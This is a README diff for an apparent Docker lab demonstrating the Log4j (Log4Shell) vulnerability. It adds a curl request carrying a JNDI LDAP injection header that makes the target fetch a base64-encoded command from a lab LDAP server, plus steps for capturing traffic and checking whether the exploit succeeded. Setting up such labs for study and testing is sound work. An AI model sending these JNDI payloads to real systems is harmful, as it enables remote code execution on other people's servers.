@@ -62,10 +62,16 @@ $> docker compose down
 $> ./scripts/cleanup.sh
 # test the Docker services and network
 $> ./scripts/test.sh
+# test if exploit has been successful
+$> docker compose exec vulnapp ls -l /tmp
 # run interactive shell on tools image container
-$> docker run -it tools
+$> docker run --name tools --network example_log4j -it tools
+# inside tools container
+$> curl vulnapp:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
+$> tcpdump -i eth0 -w /tmp/dump.log &
+# extract log from contanier
+$> docker cp tools:/tmp/dump.log .
 ```
-
 
 ## Notes
 
